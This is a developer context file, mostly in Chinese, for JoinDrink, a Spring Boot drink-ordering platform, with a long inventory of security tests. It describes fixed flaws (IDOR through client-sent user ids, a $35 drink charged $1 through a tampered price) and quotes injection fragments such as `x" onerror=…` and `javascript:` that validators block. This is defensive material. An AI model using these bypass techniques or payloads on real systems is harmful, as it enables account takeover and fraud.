# JoinDrink — Project Context for Claude

## 專案概述

**JoinDrink** 是一個多租戶飲料訂購與揪團平台，支援個人訂單（SOLO）和揪團訂單（GROUP）。
語言：繁體中文介面，後端使用英文程式碼。

## Tech Stack

| 層次 | 技術 |
|------|------|
| 語言 | Java 17 |
| 後端框架 | Spring Boot 3.4.3 |
| ORM | Spring Data JPA / Hibernate |
| 安全性 | Spring Security 6 + JWT (JJWT 0.11.5, HS512, 24h expiry) |
| 社群登入 | Firebase Admin SDK 9.4.2 (Google, Facebook, Phone) |
| 資料庫 | MySQL 8（本機 Docker，`docker-compose.yml`）|
| 快取 / 鎖 | Redis 7（本機 Docker）— 揪團購物車、分散式鎖、每日轉盤狀態 |
| 即時推播 | WebSocket/STOMP（`/ws-cart`, SockJS）|
| 圖片上傳 | Cloudinary v1.36.0（無憑證時自動改存本機 `uploads/`）|
| 圖片生成 | Java 2D (優惠券動態圖片生成) |
| API 文件 | SpringDoc OpenAPI / Swagger UI v2.8.5 |
| 建置工具 | Maven（**注意：repo 內沒有 `mvnw` 腳本，請用系統 `mvn`**）|
| 容器 | Dockerfile（多階段：`maven:3.9-eclipse-temurin-17` → `eclipse-temurin:17-jre`，非 root 執行）；CI 只建置、不推送 |
| 其他 | Lombok, JUnit 5 + Mockito（**沒有 TestNG**）, JaCoCo 0.8.12（僅產生報告，無覆蓋率門檻）, Spring Boot Actuator（僅 `/actuator/health`）|
| 前端 | Vanilla JavaScript + Tailwind CSS (無框架) |
| 前端 HTTP | Fetch API + Bearer JWT from localStorage |

## 專案結構

```
join_drink/
├── src/main/java/com/example/demo/
│   ├── controller/          # 15 REST controllers
│   ├── service/             # 32 個頂層類別（另有 order/、wallet/ 子套件共 7 個）
│   ├── entity/              # 27 JPA entities + 6 EmbeddedId 類別
│   ├── repository/          # 29 JPA repositories
│   ├── dto/                 # 25 Data Transfer Objects
│   ├── common/              # JWT、SecurityHeadersFilter、RequestIdFilter、SafeImageUrl／SafeText、GeoBounds、Cloudinary／Firebase／Swagger／WebConfig、DataSeeder、DemoDataSeeder
│   ├── config/              # RedisConfig、WebSocketConfig（掛載 StompAuthInterceptor）、StompSubscribeRules、TimeZoneConfig
│   ├── exception/           # CustomException + GlobalExceptionHandler
│   ├── DemoApplication.java # Spring Boot 入口
│   └── SecurityConfig.java  # 安全設定
├── src/main/resources/
│   ├── application.yml      # 主設定檔（僅 ${ENV_VAR:預設值}，無明文密鑰）
│   ├── application-local.yml.example # 本機設定範本
│   ├── application-local.yml # 本機設定 (git ignored)
│   └── serviceAccountKey.json # Firebase (git ignored)
├── frontend/
│   ├── Customer/            # 顧客前台（auth/ 8頁 + 主功能 12頁，共 20 HTML）
│   ├── Brand/               # 品牌總部管理後台（7 HTML）
│   └── store/               # 門市管理後台（12 HTML）
├── docker-compose.yml       # 本機 MySQL 8 + Redis 7
├── pom.xml
├── API.md                   # 完整 REST API 端點文件
├── DATABASE.md              # 27 張表 schema 說明
└── README.md                # 本機開發指南（中文）
```

> ⚠️ schema 的**唯一事實來源**是 `entity/` 下的 JPA Entity（`ddl-auto: update` 自動建表）。
> `DATABASE.md` 是對照說明文件，改 Entity 後請一併更新。

## 核心 Controllers（15 個）

| Controller | 職責 |
|-----------|------|
| `UserController` | 顧客認證、個人資料、優惠券、訂單、錢包、轉盤、常用地址 |
| `GroupOrderController` | 揪團訂單建立、加入、提交（V1 + V2）|
| `OrderController` | 訂單 V2 API（卡片列表、狀態更新、取消）|
| `BrandController` | 品牌認證、分類/商品管理、門市建立、規格配料、Dashboard、財務、口碑 |
| `BrandSpecOrderController` | 品牌規格拖曳排序 |
| `StoreController` | 門市認證、庫存管理、訂單處理、Dashboard、財務報表 |
| `CartController` | 購物車操作 |
| `PublicController` | 首頁、附近門市、搜尋、品牌、商品（公開不需登入）|
| `LocationController` | 地址搜尋、縣市區域選單 |
| `CouponController` | 優惠券查詢（舊版）|
| `DailySpinController` | 每日轉盤（spin、spin-status、game-wheel/brands、game-wheel/menu）|
| `ProductController` | 飲品 V2 API（分店飲品列表、客製化 V2、規格）|
| `UploadController` | 本地檔案上傳 |
| `UserFavoriteController` | 收藏店家（查詢、切換）|
| `AdminController` | 管理員後台（N-28）：管理員登入、待審品牌清單、核准與退件；路徑 `/api/admin/**`，僅 ADMIN 權杖 |

> ⚠️ **本專案沒有 SSE**。舊版文件曾寫「SSE 端點直接寫在 GroupOrderController /
> StoreController / OrderController 內」，但全專案 `SseEmitter` 出現次數為 0，
> 別再去找那段不存在的程式碼。即時推播全部由 WebSocket/STOMP 實作：
> 推播來源是 `messagingTemplate.convertAndSend()`，目的地為
> `/topic/order/{orderId}`（訂單狀態）與 `/topic/group/{token}`（揪團品項異動）。

## 角色與權限

- `ROLE_CUSTOMER` — 一般顧客
- `ROLE_BRAND` — 品牌總部管理員
- `ROLE_STORE` — 門市管理員
- `ROLE_ADMIN` — 平台管理員（N-28）：權杖的 authority 為 `ADMIN`；只能由 `AdminBootstrap` 建立，沒有公開註冊；權杖只在 HTTP 生效，WebSocket 拒絕

## 授權規則（SecurityConfig）

`/api/stores/**` 這一段的 **matcher 順序有意義**，改動前務必讀完註解：

1. 公開讀取端點逐一列舉（`map`、`nearby`、`search`、`*/info`、`*/v2`、`brand/**`）
2. `GET /api/stores/{storeId:[0-9]+}` — 分店公開資訊，限定數字避免誤放行 `/api/stores/orders`
3. `/api/stores/**` → `hasAuthority("STORE")` 兜底，涵蓋所有寫入端點

⚠️ `requestMatchers(String...)` **不分 HTTP method**。曾因為 `"/api/stores/*"` 整段
permitAll，導致 `PUT /api/stores/update` 對外開放且可竄改任意分店（IDOR）。
新增分店端點時請確認它落在第 3 條規則裡。

同樣的錯誤也發生過在 `/api/products/**` 與 `/api/brands/**`：整段 permitAll 使得
`POST /api/products`（直接 `save()` 原始 entity）**未登入即可新增商品**，且 `save()`
具 merge 語意，帶入既有 `id` 就能竄改他人商品售價。現已改為只放行 `HttpMethod.GET`
的具體路徑，寫入端點一律落到 `authenticated()`。

**新增任何 permitAll 路徑時，一律指定 `HttpMethod.GET`，不要用整段萬用字元。**

### 身分一律取自 token，不可取自請求參數

顧客端點的使用者身分**只能**用 `JwtAuthenticationFilter` 寫入的 request attribute：

```java
@RequestAttribute(value = "currentUserId", required = false) Long currentUserId
```

`/api/users/{userId}/**` 這類帶路徑 id 的端點，進入方法後第一件事是呼叫
`UserController.requireSelf(userId, currentUserId)`，不符即擲出 403。

⚠️ 舊版寫成 `@RequestParam(required = false) Long authUserId` 再比對
`if (authUserId != null && ...)`，但那個值是**用戶端自己送的**——攻擊者只要不帶這個
參數，檢查就整段跳過。實測任一登入顧客即可讀寫他人個資、地址與錢包餘額。
全專案已無 `authUserId`，新增端點請勿再引入同類寫法。

同一個錯誤後來在 `OrderController` 又發現一次（S-6），而且更嚴重，兩種型態：

1. **路徑參數當身分用** — `GET /api/orders/user/{userId}/cards|active|recent-cards`
   直接拿路徑上的 `userId` 去查，完全沒有比對。實測任一登入顧客可讀他人完整訂單歷史，
   包含金額、品項與揪團的 `shareToken`（拿到就能看／加入該團）。
2. **`if (userId != null) 檢查 else 放行`** — `PUT /api/orders/{orderId}/status` 與
   `/cancel/v2` 的 else 分支註解寫著「Merchant/System level update」，但門市根本走不到
   這條路徑（`/api/orders/**` 是 CUSTOMER-only）。實測**不帶 `userId` 參數**即可把
   他人訂單從 READY 改成 COMPLETED。

`OrderController` 現有 `requireSelf()` 與 `requireOwnedOrder()` 兩個私有方法，
新增端點請一律先呼叫其一。查詢參數的 `userId` 只為相容舊前端而保留，**一律不採信**。

另外刪掉了 `GET /api/orders/store/{storeId}`：它是門市視角的列表卻掛在 CUSTOMER-only
路徑下，門市呼叫不到，反而讓顧客能撈出整間門市的訂單 entity（含他人外送地址）。
門市看訂單一律用 `GET /api/stores/orders`。

同一個錯誤在 `POST /api/orders/checkout`（顧客結帳頁真正打的端點）又出現一次，而且是
**兩個問題疊在一起**：

1. **身分取自 request body** — `orderService.createOrder(request.getUserId(), ...)`。
   實測攻擊者（餘額 0）把 `userId` 換成別人的，訂單建立成功且**受害者餘額 19255 → 19220**，
   攻擊者一毛沒付。順帶一提 `saveOrUpdateUserAddress` 也吃同一個值，可以把地址寫進他人帳號。
2. **成交價取自 request body** — `totalAmount` 與 `item.finalPrice` 直接拿去扣款。
   實測帶 `finalPrice: 1`，**$35 的飲料只扣了 $1**。

現在身分一律 `currentUserId`，金額一律由 `OrderService.repriceItems()` 依資料庫重算。
`AuthorizationTest` 的 S-7 兩支守住這兩條（已驗證：改回舊寫法時兩支都轉紅）。

### ⚠️ 售價只能由伺服器算，公式在 `PricingService`

成交價 = `basePrice` ＋ 區域加價（`brand_region_category_pricing`）＋ 配料加價。
這條公式原本只寫在 `CartService.addItem` 裡，結帳端點完全沒有重算，才會出現上面的 $1 事件。

**任何會產生金額的地方都必須呼叫 `PricingService`，不要在 Service 內再寫一份**——
少算區域加價會讓區域定價失效，少算配料加價就是直接漏收錢。
`unitPriceSnapshot` / `finalPrice` / `productNameSnapshot` 這些「快照」欄位的值
一律由伺服器在成交當下決定，用戶端送什麼都會被覆蓋掉。

⚠️ 訂單編號 `generateOrderNo()` 的隨機碼原本只有 4 個十六進位字元＝65,536 種，
同一天累積 300 張單時撞號機率已接近 50%（`orders.order_no` 有唯一索引，撞到就是 500）。
已改為 10 個字元，不要改回去。

## 測試

`mvn test`（需先 `docker compose up -d`，測試會連本機 MySQL 與 Redis）。

**目前規模（2026-10-24，以 `grep -rhE '^\s*@Test\b' src/test/java | wc -l` 計算）：530 個 `@Test`，分布在 96 個測試類別。** 指令一定要有 `\b`：不加的話，`ImageStorageServiceTest` 第 30 行的 `@TestPropertySource` 也會被算進來，變成 218。新增或刪除測試時，請同步更新此表與這段數字。CI 的「測試總計與略過檢查」步驟會把 Surefire 的測試數印成 annotation（2026-10-13 的 run 38352055664 為 217，2026-10-18 的 run 39066084888 為 359，2026-10-21 的 run 39581843911 為 467，2026-10-22 的 run 39712451888 為 470，2026-10-23 的 run 40077641128 為 515，與這裡一致）；略過的測試會讓該步驟失敗。

| 區域 | 測試（數量） | 守住的東西 |
|------|-------------|-----------|
| 授權與路由 | `AuthorizationTest`（23） | 未認證商品寫入、跨帳號讀寫個資／錢包／訂單、偽造參數與「不帶參數」兩種繞過、拿他人 userId 結帳、竄改 finalPrice、跨帳號讀寫收藏、消耗他人優惠券、debug 與門市傾印端點已移除；非 ADMIN 權杖不可進入管理員後台、管理員權杖可讀待審清單（N-28）；登出所有裝置（stage 8）：不可撤銷他人的權杖，撤銷自己的權杖後同一權杖即被拒絕 |
| 授權與路由 | `AuthorizationRouteInventoryTest`（3） | 列舉全部路由：非公開路由匿名呼叫必須回 401／403；公開清單的每一條都必須真的存在（ADR-0003） |
| 授權與路由 | `GroupOrderSecurityTest`（5） | 揪團 H-1～H-3：伺服器重算價格與歸屬；他人的 couponId 被拒；非團長不可改他人揪團狀態；團長本人的截單與重開可行，亂打的狀態被白名單擋下 |
| 授權與路由 | `GroupOrderServiceAuthorizationTest`（10） | 揪團讀取與加入：只有發起人能取得分享 token；非成員不可讀數字 id 的明細；舊版加入必須帶正確的 token；拒絕他品牌的商品與門市停售的商品 |
| 授權與路由 | `GroupOrderControllerViewerTest`（2） | 揪團查詢的 viewer 只取自 JWT 寫入的 request attribute，不取自參數；匿名請求以無 viewer 查詢 |
| 授權與路由 | `StompSubscribeRulesTest`（11） | WebSocket 訂閱授權的純規則：顧客只能訂閱自己參與的訂單；揪團推播只開放成員（團長，或已在團內有品項的團員），持分享連結但未加入者不可訂閱（N12）；門市只能訂閱自己的頻道；角色必須相符（id 會撞號）；未知目的地與超大數字 id 一律拒絕 |
| 授權與路由 | `StompAuthInterceptorTest`（27） | WebSocket 認證與訂閱授權，走真實的通道與真實的 JWT（只 mock 資料庫）：缺標頭、非 Bearer、偽造、過期、亂碼的 token 一律拒絕；發起人與參與者可訂閱訂單；非參與者與同 id 的門市不可訂閱；門市只能訂閱自己的頻道；揪團推播的發起人（即使沒有品項）與已在團內有品項的團員可訂閱，只持分享連結者不可訂閱（N12）；門市不可訂閱揪團推播；已刪除或不存在的帳號、連線後 token 過期者不可連線或訂閱（N7）；客戶端直接 SEND 一律拒絕（N5）；權杖版本與帳號目前版本不符（改過密碼前簽發）者不可連線，連線後改密碼，之後的 SUBSCRIBE 一律拒絕（N13）；管理員權杖不可連線（N-28） |
| 授權與路由 | `WebSocketWiringTest`（1） | 攔截器確實掛在 `clientInboundChannel` 上（載入 Spring context） |
| 授權與路由 | `AccountStatusTest`（17） | 帳號可用性規則（N7）：未刪除的顧客、存在的品牌與門市可用；已刪除、不存在、未知角色或缺少 id 一律不可用；HTTP 與 STOMP 共用此規則；權杖版本不符（改過密碼前簽發）或角色已改變者一律不可用（N13）；顧客 token 不比對門市資料列（id 會撞號）；品牌未核准不可使用（N-28）；管理員只在傳入管理員儲存庫時可用，WebSocket 一律不可用（N-28）；停用的品牌與分店不可用，分店所屬品牌停用時亦然（stage 6） |
| 授權與路由 | `StoreVisibilityTest`（3） | 分店可見性的純規則（stage 6）：分店與品牌都未停用才可連到，任一停用即不可連到；實體版本讀取兩個旗標，沒有品牌時只看分店本身；列表條件要求營業中，且兩者都未停用 |
| 授權與路由 | `StoreVisibilityGuardTest`（1） | 文字掃描（反射）（stage 6）：`StoreRepository` 每一條公開列出分店的 `@Query`（含計數查詢）都必須套用 `StoreVisibility.FILTER`，漏掉條件的查詢會紅 |
| 授權與路由 | `SuspensionVisibilityServiceTest`（5） | 停用對公開讀取的影響（stage 6，純邏輯）：品牌列表只查已核准且未停用的品牌；停用的品牌詳情回 404，底下已停用的分店不列出；分店詳情與地圖清單只走可見查詢；分店或品牌停用時分店菜單回 404，不讀取菜單 |
| 授權與路由 | `SuspensionPublicReadsTest`（4） | 停用對商品與轉盤的影響（stage 6，純邏輯）：分店停用時上架商品清單為空，且不查詢商品；品牌停用時商品詳情回 404，規格與客製化選項不對外；客製化選項帶入已停用的分店時回 null；品牌停用時轉盤分類為空、不能抽獎（不取得鎖、不寫入今日標記） |
| 授權與路由 | `StoreSuspensionIntegrationTest`（3，載入 Spring context） | 停用的資料庫層驗證（stage 6，真實資料庫）：停用品牌後分店立即不可見，品牌與分店的舊權杖失效，恢復後舊權杖仍無效；單一分店停用只影響該分店；待審品牌不可停用（409） |
| 授權與路由 | `BrandReferenceTest`（6） | 品牌參照（N-33，純函式）：同一品牌相符；不同品牌不符；被參照的品項或分店任一方沒有品牌時不符（fail-closed）；以值比較而非物件參照（超過 Long 快取範圍的 id 也相符） |
| 授權與路由 | `AnalyticsServiceToggleDrinkSupplyTest`（5，Mockito） | 門市切換飲品供應（N-33）：本品牌的飲品寫入供應狀態；他品牌與不存在的飲品回同一個 404 且不寫入；分店沒有品牌時任何飲品都不能切換；isAvailable 缺少回 400，且在查詢任何資料前拒絕 |
| 授權與路由 | `StoreControllerToggleToppingTest`（4，Mockito） | 門市切換配料供應（N-33）：本品牌的配料寫入缺貨狀態；他品牌與不存在的配料回同一個 404 且不寫入；isAvailable 缺少回 400，且在查詢任何資料前拒絕 |
| 授權與路由 | `StompSessionRegistryTest`（5） | WebSocket 工作階段登錄表（stage 6，純邏輯）：切斷某帳號只影響該帳號；顧客與門市 id 相同時互不影響（N13）；角色比對不分大小寫；工作階段結束後移除切斷旗標；null 一律忽略 |
| 授權與路由 | `CutSessionOutboundInterceptorTest`（2） | 切斷的工作階段的訊息一律丟棄，其他工作階段不受影響；沒有工作階段 id 的訊息（例如系統訊息）原樣放行（stage 6） |
| 授權與路由 | `StompSessionListenerTest`（3） | CONNECT 後的工作階段登錄（stage 6）：可使用的帳號登錄且不被切斷；登錄時帳號已被停用（停用交易早於登錄）時立即切斷；未經認證的連線直接切斷 |
| 授權與路由 | `AccountSuspensionCutListenerTest`（2） | 停用事件（`AccountsSuspendedEvent`）切斷列出的帳號所有工作階段，其他帳號不受影響（stage 6，`AFTER_COMMIT`）；切斷綁在 `AFTER_COMMIT`，以反射讀取註解固定（2026-10-21） |
| 授權與路由 | `TokenRevocationCutListenerTest`（2） | 登出所有裝置的切斷（stage 8，純邏輯）：撤銷事件只切斷列出的顧客帳號，同 id 的門市與其他顧客不受影響；切斷綁在 `AFTER_COMMIT`，以反射讀取註解固定（2026-10-22） |
| 授權與路由 | `JwtAuthenticationFilterTest`（15） | JWT 過濾器：已刪除或不存在的帳號 token 被拒；有效的顧客、品牌、門市 token 通過；未知角色被拒；改密碼前簽發的顧客或門市 token 被拒、改密碼後簽發的通過（N13）；角色已改變的顧客 token 被拒（N13）；待審品牌的 token 被拒（N-28）；管理員 token 須存在且版本相符（N-28） |
| 帳號與登入 | `BrandApprovalTest`（3） | 品牌審核狀態的純規則（N-28）：只有完全等於 APPROVED 才算已核准，空值與大小寫不同一律拒絕；只有 PENDING 可被核准或退件；登入被擋下的說明依狀態而異 |
| 帳號與登入 | `BrandServiceApprovalTest`（6） | 品牌自助註冊與登入（N-28）：註冊一律建立為 PENDING；待審或退件即使密碼正確也不發放權杖（403）；密碼錯誤一律 401，不因審核狀態改變回應；核准後取得權杖；被停用的品牌不可登入（403，stage 6） |
| 帳號與登入 | `AdminServiceTest`（14） | 管理員登入與品牌審核（N-28）：正確密碼發放帶版本的 ADMIN 權杖；密碼錯誤與帳號不存在回同一訊息；核准或退件只成功一次（條件式更新），已處理回 409，不存在回 404；待審清單的頁碼與筆數有上下限。品牌與分店的停用與恢復（stage 6）：停用遞增版本並發布切斷事件，恢復不遞增，重複操作回 409，只能停用已核准的品牌 |
| 帳號與登入 | `StoreLoginSuspensionTest`（4） | 分店登入（stage 6）：分店被停用或所屬品牌被停用時，密碼正確也不發放權杖（403）；密碼錯誤仍回 401，不因停用狀態改變回應；分店與品牌都未停用時發放權杖 |
| 帳號與登入 | `AdminBootstrapTest`（5） | 管理員首次建立（N-28）：未設定時不做任何事；帳號不存在才以 BCrypt 雜湊建立；已存在不覆寫密碼；明文密碼與不合法的帳號格式一律拒絕啟動 |
| 帳號與登入 | `AuthServiceSecurityTest`（9） | 帳號安全：mock Firebase token 只在 mock 模式可用；已刪除帳號不可經社群登入；手機證明不可與他人的社群 UID 併用；合併帳號時拒絕其他號碼的 token；社群 provider 不符時在設定密碼前拒絕；手機驗證權杖只能使用一次（ADR-0009）；預先檢查 `verifyOnly` 不消耗權杖。行為層需要 Mockito，只在 CI 執行 |
| 帳號與登入 | `SocialSignupRulesTest`（6） | 社群登入的帳號狀態決策：已綁定、手機衝突、建立新帳號；不變量：手機已被使用就絕不另建帳號 |
| 帳號與登入 | `SmsModeDefaultTest`（3） | sms.mode 預設必須是 firebase（fail-closed，N15）；application.yml 不得把 mock 設為未設定 SMS_MODE 時的預設；prod 與 local 範本各自明確指定 |
| 帳號與登入 | `AuthServiceSmsModeGuardTest`（6） | prod profile 下 `sms.mode` 不是 firebase 就拒絕（含 `MOCK_TOKEN` 分支） |
| 帳號與登入 | `JwtUtilsProdGuardTest`（4） | JWT 密鑰：dev 可用預設值；prod 拒絕預設值與空白密鑰；prod 接受隨機密鑰 |
| 帳號與登入 | `JwtTokenVersionTest`（3） | 權杖的帳號版本聲明（N13）：簽發時的版本可原樣解析；沒有版本聲明的舊權杖視為版本 0，部署後既有登入不被強制登出。需要 jjwt，只在 CI 執行 |
| 帳號與登入 | `UserTokenVersionTest`（4） | 改密碼與撤銷權杖會遞增帳號版本（N13）；撤銷只動版本、不動密碼；新帳號從版本 0 開始 |
| 帳號與登入 | `UserServiceLogoutAllTest`（3） | 登出所有裝置的服務層（stage 8，Mockito）：遞增權杖版本並寫回；發布的撤銷事件列出該顧客（角色 CUSTOMER）；找不到帳號回 404，不寫入、不發布事件（2026-10-22） |
| 帳號與登入 | `DemoDataSeederProdGuardTest`（2） | prod profile 不植入示範帳號，即使 `DEMO_DATA_ENABLED=true` |
| 帳號與登入 | `LoginAttemptLimiterTest`（10） | 登入／OTP 固定視窗限流（ADR-0004）；偽造的 `X-Forwarded-For` 不改變識別；Redis 不可用時退回本地計數；Redis 拋例外時仍以本地計數擋下第三次 |
| 帳號與登入 | `PhoneProofRateLimitGuardTest`（1） | 手機驗證端點全部限流（文字掃描）：重設密碼、設定密碼、綁定、建立帳號共五條路由都必須呼叫 `loginAttemptLimiter.check` |
| 帳號與登入 | `JwtAlgorithmTest`（7） | JWT 演算法白名單（純邏輯）：只接受 HS512；HS256、none、非對稱演算法一律拒絕；header 重複或以跳脫字元寫 `alg` 也拒絕 |
| 帳號與登入 | `JwtAlgorithmEnforcementTest`（3） | 白名單接上 jjwt：HS512 權杖仍可解析；同一把金鑰簽的 HS256 被拒；未簽章權杖被拒。需要 jjwt，只在 CI 執行 |
| 帳號與登入 | `ClaimStoreTest`（7） | 「只記一次」儲存（純邏輯）：本地一定記錄；遠端說已記過即拒絕；遠端失敗退回本地並通知；遠端回 null 視為已記過；Redis 恢復後本地紀錄仍擋重放；有效期過後可再記 |
| 帳號與登入 | `FirebaseTokenReplayGuardTest`（5） | 手機驗證權杖只能使用一次：同一張第一次通過、之後拒絕；不同權杖互不影響；遠端鍵是前綴加 SHA-256 指紋、不含權杖；保留時間長於 ID token 的 1 小時有效期 |
| 帳號與登入 | `TokenFingerprintTest`（5） | 權杖指紋為標準 SHA-256（已知答案）、穩定、64 位小寫十六進位，且不含原始權杖；空白或 null 拒絕 |
| 帳號與登入 | `LocalClaimStoreTest`（4） | JVM 內的「只記一次」：同一 key 第二次失敗；不同 key 獨立；有效期過後可再記；過期紀錄會被清除 |
| 帳號與登入 | `PhoneTokenSingleUseGuardTest`（2） | 文字掃描：`verifyFirebasePhone` 必須記錄權杖；預先檢查 `verifyOnly` 不得記錄（否則註冊頁的預先檢查會讓真正的請求失效） |
| 金流與併發 | `WalletConcurrencyTest`（3） | 併發儲值不可短少、帳本與餘額必須相符、併發扣款不可透支、列鎖不被一級快取架空 |
| 金流與併發 | `GroupCheckoutConcurrencyTest`（6） | 揪團四條金流路徑重複觸發時只能發生一次；同一張券不可用兩次 |
| 金流與併發 | `GroupOrderCheckoutIdempotencyTest`（8） | 團長結帳的冪等鍵（stage 9，不載入 Spring context）：同鍵重送回放第一次的成功結果；4xx 釋放佔位、可以重試；提交之後的讀取或推播失敗仍回成功；同鍵搭配不同內容回 422；同鍵用在另一團互不影響；未帶鍵維持舊行為；格式不合規的鍵在送單前拒絕 |
| 金流與併發 | `UserCouponUseTest`（4） | 優惠券使用（N10）：消耗是條件式原子更新，同一張券第二次使用回 400（即使讀取時仍為 unused）；非擁有者與已過期的券不嘗試消耗 |
| 金流與併發 | `RatingConcurrencyTest`（2） | 併發評分不得死鎖、門市則數與平均分數要對得起來 |
| 金流與併發 | `IdempotencyServiceTest`（14） | 結帳冪等（ADR-0005）：格式檢查、重送回放、進行中衝突、失敗與例外釋放、使用者之間互不影響；同一把鍵配不同內容回 422（請求指紋）；Redis 與本地兩條路徑；舊格式（無指紋）紀錄仍可重播 |
| 金流與併發 | `OrderServiceCheckoutLockTest`（1） | 結帳使用者鎖忙碌時回 503（`OrderService.createOrder`），不是一般的 RuntimeException（400） |
| 金流與併發 | `OrderControllerCheckoutFailureTest`（2） | 結帳失敗的 HTTP 結果（不載入 Spring context）：忙碌（503）原樣拋出，交給 GlobalExceptionHandler；業務拒絕仍回 400 的回應 |
| 金流與併發 | `StoreSuspensionPaymentGuardTest`（6） | 停用期間的付款守衛（stage 6，ADR-0012 決策 5，不載入 Spring context）：停用的分店或品牌時，個人結帳（`createOrder`）、單人下單（`placeOrder`）、團員付款、補款與建立揪團（`createGroupOrderV2`）都回 400，且付款路徑不鎖定未付款品項 |
| 金流與併發 | `ExclusiveJobRunnerTest`（3） | 排程互斥（ADR-0006）：他人持鎖時略過；取得鎖時執行並以同一 token 釋放；任務拋出例外仍釋放 |
| 金流與併發 | `TxDisplayTest`（7） | 帳本種類正規化：舊的「標題\n說明」格式要能拆回兩欄、補款靠正負號分辨收付方 |
| 金流與併發 | `GroupOrderServiceCancelRefundTest`（5） | 整單取消（N-32，2026-10-19）：個人訂單取消只靠 escrow 退一次，不逐品項再退；券全額折抵時不退款；揪團取消還原未付款品項的券；PREPARING 不取消也不退款 |
| 金流與併發 | `AnalyticsServiceAutoRejectTest`（8） | 店家接單與拒單、逾時自動拒單（N-32）：逾時且仍 SUBMITTED 以列鎖讀取、退款一次、改為 REJECTED；剛好 10 分鐘不拒單；鎖內發現已接單不拒單；接單後拒單回 409；他店 403 |
| 金流與併發 | `OrderAutoRejectJobTest`（3） | 逐筆自動拒單（N-32）：只推播真的被拒的訂單；單筆失敗不影響其他筆；沒有逾時訂單時不做事 |
| 金流與併發 | `ScheduledTasksAutoRejectTest`（1） | 自動拒單排程經 `ExclusiveJobRunner`（`order-auto-reject`，120 秒租約）執行，取得鎖後才掃描 |
| 訂單規則 | `ItemSpecResolverTest`（9） | 固定規格防竄改（見下方「品項規則抽在 service/order/」）；非固定規格的自訂值拒絕標籤字元、控制字元與超過 50 字 |
| 訂單規則 | `ItemHashTest`（6） | 品項識別碼：配料順序不影響合併、套券的那杯要拆開 |
| 訂單規則 | `CouponEligibilityTest`（6） | 優惠券適用範圍、已付款不可套券 |
| 訂單規則 | `CheckoutFailureTest`（2） | 結帳失敗分類（純函式）：只有明確標示 503 的 CustomException 是系統忙碌；業務拒絕與同訊息的一般例外都不是 |
| 訂單規則 | `MemberCancelSettlementTest`（9） | 團員取消品項的退款規則：只有真的付過（PAID／ESCROWED）才會退，且以 `escrowAmount` 為上限 |
| 訂單規則 | `OrderStatusGuardTest`（5） | 顧客端狀態轉換白名單（`OPEN\|SUBMITTED → CANCELLED`、`SUBMITTED → PAID`） |
| 訂單規則 | `GroupRefundPolicyTest`（9） | 揪團退款與權限（純函式）：送單前錢包退團員、現金與信用卡入團長帳號、送單後一律入團長、截單後團員不可自行取消、整單取消至店家接單前 |
| 訂單規則 | `GroupItemRulesTest`（15） | 揪團品項規則（載入 Spring context）：跨團 token 回 404、送單前後的團員取消、團長移除與整單取消、截單中可刪除、接單後不可刪除、狀態切換 |
| 訂單規則 | `PricingServiceTest`（5） | 定價：規格與加料取用伺服器價格；拒絕未設定的規格與加料；加料數量上限與重複選取 |
| 訂單規則 | `QuantityLimitsTest`（1） | 數量只接受範圍內的整數 |
| 訂單規則 | `CartServiceTest`（1） | 購物車小計 = 單價 × 數量 |
| 訂單規則 | `RedisCartServiceTest`（5） | Redis 購物車的快照不含 LAZY 欄位；品項的 product 為 null 也能存；寫入與移除後刷新購物車鍵的 30 天保留期；活躍索引修剪到保留期內並刷新其保留期（2026-10-22） |
| 訂單規則 | `BrandServiceReferenceTest`（2） | 品牌參照：拒絕引用他品牌的分類、規格與加料 id |
| 訂單規則 | `OrderNoFormatTest`（2） | 訂單編號格式為 ORD＋MMdd＋10 位十六進位；同一天 300 張單不重複 |
| 訂單規則 | `AutoRejectPolicyTest`（7） | 逾時規則（純邏輯，N-32）：只有 SUBMITTED 適用；計時起點為 `submittedAt`，缺值退回 `createdAt`；嚴格超過 10 分鐘才逾時；OPEN 與接單後不逾時；缺時間資料不逾時 |
| 訂單規則 | `GroupEscrowRuleTest`（4） | 代墊金（N-32）：只有錢包結帳會留 escrow；現金與信用卡為 0；判斷與扣款條件相同（只認大寫 WALLET）；沒有金額為 0 |
| 輸入與輸出安全 | `StorePhoneExposureTest`（2） | 分店回應不洩漏店長手機（N6）：公開的分店資料只含店家電話；店家後台本人的 profile 仍有店長手機供表單使用 |
| 輸入與輸出安全 | `PhoneMaskTest`（7） | 記錄檔用的手機遮罩（N17）：只保留末三碼、輸出只含星號與數字（防止偽造 log 行）；沒有手機時標示為（無） |
| 輸入與輸出安全 | `LogPhoneGuardTest`（1） | 記錄檔不得含原始手機（N17）：掃描 `src/main/java` 內所有 `log.*(` 呼叫，提到手機的必須經過 `PhoneMask.mask()` |
| 輸入與輸出安全 | `InlineHandlerInterpolationGuardTest`（3） | 前端 inline 事件屬性不得插入 `${…}`（N-14）：掃描 `frontend/` 下的 `.html`、`.js`（排除 `vendor/`），同一個屬性值內出現 `${` 即違規；`data-*` 與屬性之外的插值不誤判 |
| 輸入與輸出安全 | `SafeImageUrlTest`（7） | 圖片網址白名單：擋 `x" onerror=…`、`javascript:`、`../`、控制字元 |
| 輸入與輸出安全 | `SafeTextTest`（9） | 會顯示給他人看的名稱：拒絕 `< > " \`` 與控制字元、上限 30 字；第三方登入名稱只清理、不拒絕；標籤型欄位（規格、分類、商品等）另有 50／100 字上限，並同樣拒絕標籤字元（`normalizeLabel`） |
| 輸入與輸出安全 | `UploadControllerTest`（4） | 通用圖片上傳以檔案內容（magic bytes）判斷，副檔名改成 .png 的 HTML 被拒；副檔名白名單；5 MB 上限；內容為 PNG 時成功並交給儲存服務 |
| 其他 | `GeoBoundsTest`（5） | 附近店家的矩形預篩必為 50 km 圓的超集（取樣驗證） |
| 其他 | `RequestIdFilterTest`（5） | `X-Request-Id` 的沿用與替換規則；請求結束後 MDC 清空 |
| 其他 | `ImageStorageServiceTest`（4） | 無 Cloudinary 憑證時改走本機儲存、同 publicId 覆寫、可疑副檔名正規化 |
| 其他 | `BrandSummaryJsonTest`（2） | 品牌清單的 JSON 欄位名稱（`brandId`、`brandName`、`logoUrl`）是前端的契約 |
| 其他 | `PageSizeClampTest`（8） | 列表分頁夾制：門市訂單、附近店家、錢包帳本、店家搜尋的 page／size 都有上下限；page 為 0 或負數時視為第一頁；搜尋的 size 上限為 200 |
| 其他 | `PublicServiceSearchTest`（8） | 店家搜尋分頁（2026-10-18）：品牌路徑的頁碼、距離路徑的 LIMIT／OFFSET、總筆數來自 COUNT、hasNext 的邊界與整除、結果順序、距離為 NULL 不失敗 |
